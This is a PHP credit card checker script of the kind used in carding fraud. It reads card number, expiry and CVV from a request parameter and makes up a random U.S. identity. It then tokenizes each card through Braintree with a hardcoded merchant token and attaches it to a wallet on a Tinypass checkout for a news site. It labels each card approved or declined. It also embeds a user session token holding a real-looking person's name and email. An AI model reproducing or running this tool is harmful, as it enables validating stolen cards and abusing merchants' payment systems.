<?php

error_reporting(0);
date_default_timezone_set('America/New_York');

function multiexplode($delimiters, $string)
{
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

function rebootproxys()
{
    $proxySocks4 = file("proxy.txt");
    $myproxy = rand(0, sizeof($proxySocks4) - 1);
    $proxySocks = $proxySocks4[$myproxy];
    return $proxySocks;
}

$proxySocks4 = $_GET['proxy'];
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

if (file_exists(getcwd() . '/cookie.txt')) {
    @unlink('cookie.txt');
}

// Fetch a random U.S. user
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');

// Decode JSON
$data = json_decode($get, true);

// Extract user details safely
$first_name = $data['results'][0]['name']['first'] ?? null;
$last_name  = $data['results'][0]['name']['last'] ?? null;
$email      = $data['results'][0]['email'] ?? null;

// Replace domain if email exists
if ($email) {
    $updated_email = str_replace('@example.com', '@gmail.com', $email);

    // Print parsed user info
//     echo "<h3>Parsed Random User Details:</h3>";
//     echo "<pre>First Name : " . htmlspecialchars($first_name) . "</pre>";
//     echo "<pre>Last Name  : " . htmlspecialchars($last_name) . "</pre>";
//     echo "<pre>Original Email : " . htmlspecialchars($email) . "</pre>";
//     echo "<pre>Updated  Email : " . htmlspecialchars($updated_email) . "</pre>";
// } else {
//     echo "<h3 style='color:red;'>Failed to fetch user data from response.</h3>";
}


$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_ENCODING, '');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POST, 1);

// Your dynamic card variables (ensure defined earlier)
// $cc  = '4038390050500282';
// $mes = '06';
// $ano = '2026';
// $cvv = '808';

$postData = [
    "clientSdkMetadata" => [
        "source" => "client",
        "integration" => "custom",
        "sessionId" => "1fec8b7f-7e3b-4f1d-9c75-5d107f6c4227"
    ],
    "query" => "mutation TokenizeCreditCard(\$input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: \$input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }",
    "variables" => [
        "input" => [
            "creditCard" => [
                "number" => $cc,
                "expirationMonth" => $mes,
                "expirationYear" => $ano,
                "cvv" => $cvv
            ],
            "options" => ["validate" => false]
        ]
    ],
    "operationName" => "TokenizeCreditCard"
];

curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postData));

$headers = [
  'accept: */*',
  'accept-encoding: gzip, deflate, br, zstd',
  'accept-language: en-GB,en-US;q=0.9,en;q=0.8',
  'authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NjE0OTMwNDMsImp0aSI6IjdiMDNmMGRjLTA2ZjctNDU0Mi04ODJmLTk5ODI3NmQ4YWNjMCIsInN1YiI6InhwYjZkM3B0NjJocjRtMjciLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InhwYjZkM3B0NjJocjRtMjciLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlLCJ2ZXJpZnlfd2FsbGV0X2J5X2RlZmF1bHQiOmZhbHNlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiLCJCcmFpbnRyZWU6Q2xpZW50U0RLIl0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6IlNvdXJjZU1lZGlhX2luc3RhbnQiLCJwYXlwYWxfY2xpZW50X2lkIjoiQVJYNmxKLUFwbWxKdkx0aVhNekJFSU1hTmdHb0RNTURiaXluc2VYZDJSZzhTc1cwLWcwN2ZtQ25HcVpqejYtUXVqOXp4VWVSRXJIYmRiM0wifX0.CVY-1Ezdupgc6nH8scyuHcarkBpqeFwBSOzU4lOvlM_FecBQqb9EBY1cP9JMB7sCNgcNjw06HjxilZzqdsrufw',
  'braintree-version: 2018-05-10',
  'content-type: application/json',
  'origin: https://assets.braintreegateway.com',
  'referer: https://assets.braintreegateway.com/',
  'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36'
];
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

// Cookies
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');

// Execute request
$response = curl_exec($ch);

if (curl_errno($ch)) {
    die('cURL Error: ' . curl_error($ch));
}

curl_close($ch);

// Decode response
$response_data = json_decode($response, true);

// Extract token and BIN
$token = $response_data['data']['tokenizeCreditCard']['token'] ?? null;
$bin   = $response_data['data']['tokenizeCreditCard']['creditCard']['bin'] ?? null;

///echo "<h3>Braintree Response:</h3>";
///echo "Token: " . htmlspecialchars($token) . "<br>";
///echo "BIN: " . htmlspecialchars($bin) . "<br>";

// Stop if token missing
if (!$token) {
    die("<strong>No token generated — stopping.</strong>");
}

// ========================
// 3. MYCAUSE API REQUEST
// ========================
$url = "https://buy.tinypass.com/checkout/myaccount/walletCreate?aid=XUnXNMUrFF";

$ch2 = curl_init();

$postFields = [
    "paymentMethodNonce" => $token,
    "source" => 4,
    "countryCode" => "IN",
    "needToApplyDefaultPaymentMethod" => false,
    "deviceData" => json_encode([
        "correlation_id" => "1fec8b7f-7e3b-4f1d-9c75-5d107f6c"
    ]),
    "nickname" => "",
    "cardType" => "Visa"
];

curl_setopt_array($ch2, [
    CURLOPT_URL => $url,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => json_encode($postFields, JSON_UNESCAPED_SLASHES),
    CURLOPT_ENCODING => '', // auto-handle gzip/deflate/br
    CURLOPT_SSL_VERIFYPEER => 0,
    CURLOPT_SSL_VERIFYHOST => 0,
    CURLOPT_HTTPHEADER => [
        'accept: application/json, text/plain, */*',
        'accept-encoding: gzip, deflate, br, zstd',
        'accept-language: en-GB,en-US;q=0.9,en;q=0.8',
        'content-type: application/json;charset=UTF-8',
        'cookie: LANG=en_US',
        'ng-request: 1',
        'origin: https://buy.tinypass.com',
        'priority: u=1, i',
        'referer: https://buy.tinypass.com/checkout/myaccount/show?widget=myaccount&displayMode=inline&iframeId=uvE8eROaF0iETJnb&url=https%3A%2F%2Fwww.americanbanker.com%2Fmy-account&initialWidth=&initialHeight=&maxHeight=&v3ApiEndpoint=https%3A%2F%2Fbuy.tinypass.com%2Fapi%2Fv3&pianoIdUrl=https%3A%2F%2Fauth.americanbanker.com%2Fid%2F&width=1520.800048828125&pageViewId=mh6g11xd876rpdvl&tbc=%7Bkpex%7DVcnfASKKa8ktEfY6GYVeu63mtpBpfXRAjweZDfw0KXpbdlfuhYScMajK3gzYzHCd&browserId=mehniaewbz89cyyy&contentType=website&pageTitle=Membership&userState=registered&userProvider=piano_id&userToken=eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczovL2lkLnBpYW5vLmlvIiwic3ViIjoiUE5JS2h5MTJjc3hvdGZ4IiwiYXVkIjoiWFVuWE5NVXJGRiIsImxvZ2luX3RpbWVzdGFtcCI6IjE3NTU1NTM5NTY1ODYiLCJnaXZlbl9uYW1lIjoiVkVST05JUVVFIiwiZmFtaWx5X25hbWUiOiJMQUNST0lYIiwiZW1haWwiOiJ2ZXJvbmlxdWUxMmxhY3JvaXhAZ21haWwuY29tIiwiZXhwIjoxNzcxMzIxOTU2LCJpYXQiOjE3NTU1NTM5NTYsImp0aSI6IlRJTFBQWVNOZ290MTdtM28iLCJwYXNzd29yZFR5cGUiOiJwYXNzd29yZEV4cGlyZWQiLCJyIjp0cnVlLCJscyI6IkdPT0dMRSIsInNpIjoiMTE2MDc5NzE0MDE5MTc5NjU4MTMyIiwic2MiOjAsInRzYyI6Mn0.HiYDrkfeQh2YC7QTtUYUDkmlKSeXzjaybOWl0WY4VUo&aid=XUnXNMUrFF',
        'sec-ch-ua: "Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        'sec-fetch-storage-access: active',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
        'userprovider: piano_id',
        'usertoken: eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczovL2lkLnBpYW5vLmlvIiwic3ViIjoiUE5JS2h5MTJjc3hvdGZ4IiwiYXVkIjoiWFVuWE5NVXJGRiIsImxvZ2luX3RpbWVzdGFtcCI6IjE3NTU1NTM5NTY1ODYiLCJnaXZlbl9uYW1lIjoiVkVST05JUVVFIiwiZmFtaWx5X25hbWUiOiJMQUNST0lYIiwiZW1haWwiOiJ2ZXJvbmlxdWUxMmxhY3JvaXhAZ21haWwuY29tIiwiZXhwIjoxNzcxMzIxOTU2LCJpYXQiOjE3NTU1NTM5NTYsImp0aSI6IlRJTFBQWVNOZ290MTdtM28iLCJwYXNzd29yZFR5cGUiOiJwYXNzd29yZEV4cGlyZWQiLCJyIjp0cnVlLCJscyI6IkdPT0dMRSIsInNpIjoiMTE2MDc5NzE0MDE5MTc5NjU4MTMyIiwic2MiOjAsInRzYyI6Mn0.HiYDrkfeQh2YC7QTtUYUDkmlKSeXzjaybOWl0WY4VUo',
        'x-requested-with: XMLHttpRequest'
    ],
]);

$response2 = curl_exec($ch2);

if (curl_errno($ch2)) {
    echo "<h3 style='color:red;'>cURL Error:</h3><pre>" . curl_error($ch2) . "</pre>";
} else {
    ///echo "<h3>Wallet Create Response:</h3>";
    ///echo "<pre>" . htmlspecialchars($response2) . "</pre>";
}

curl_close($ch2);





////////////////////////////===[Card Response]

// Convert response to lowercase for consistent matching
// $response2 should contain the raw JSON/text from the gateway
$raw      = strtolower((string)($response2 ?? ''));
$decoded  = json_decode($response2, true);   // try to decode JSON
$errMsg   = null;

// If the API returned an errors[] array, pull the first message
if (is_array($decoded) && isset($decoded['errors'][0]['msg'])) {
    $errMsg = trim((string)$decoded['errors'][0]['msg']); // e.g., "Transaction cannot be processed at this time, please try again later."
}

// Defaults
$status = '#Reprovadas';
$badge  = 'badge-danger';
$desc   = $errMsg ?: 'Server Failure / Error Not Listed';

// ✅ Approvals / success patterns
if (
    strpos($raw, 'paymentmethod') !== false ||
    strpos($raw, 'insufficient funds') !== false ||
    strpos($raw, 'limit exceeded') !== false ||
    strpos($raw, 'card issuer declined cvv') !== false ||
    strpos($raw, '"success":true') !== false
) {
    $status = '#Aprovada';
    $badge  = 'badge-success';

    if (strpos($raw, 'paymentmethod') !== false)                 $desc = 'Wallet Created Successfully';
    elseif (strpos($raw, 'insufficient funds') !== false)        $desc = 'INSUFFICIENT FUNDS';
    elseif (strpos($raw, 'limit exceeded') !== false)            $desc = 'LIMIT EXCEEDED';
    elseif (strpos($raw, 'card issuer declined cvv') !== false)  $desc = 'Card Issuer Declined CVV';
    elseif (strpos($raw, '"success":true') !== false)            $desc = 'Card Authorised';
}

// Output
echo "<font size=3 color='black'>
        <font class='$badge'>$status <i class='zmdi zmdi-check'></i></font>
        $cc|$mes|$ano|$cvv
        <font size=3 color='black'>
            <font class='$badge'>$desc</font>
        </font><br>";

// Close curl handle if present
if (isset($ch) && is_resource($ch)) {
    curl_close($ch);
}
ob_flush();
///echo $response2;

?>
